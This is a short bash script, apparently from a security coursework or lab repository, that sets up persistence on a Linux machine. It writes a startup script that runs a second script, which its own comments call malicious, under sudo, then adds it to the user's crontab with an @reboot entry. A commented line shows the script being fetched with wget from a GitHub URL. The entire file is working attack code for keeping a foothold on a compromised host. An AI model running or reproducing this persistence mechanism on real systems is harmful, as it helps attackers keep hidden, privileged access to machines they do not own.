#!/bin/bash

# wget https://raw.githubusercontent.com/S692/ossas/main/Gp5_persistence1.sh
# chmod +x Gp5_persistence1.sh

# create shell script that runs a malicious script at start up
echo "[+] Creating shell script that runs a malicious script at start up..."

cd /home/resch/.scripts
echo "sudo /home/resch/.scripts/Gp5_persistence2.sh" > startup_scripts.sh
chmod +x ./startup_scripts.sh
# adding startup script to cron
(crontab -l ; echo "@reboot /home/resch/.scripts/startup_scripts.sh")| crontab -

echo "[+] Done."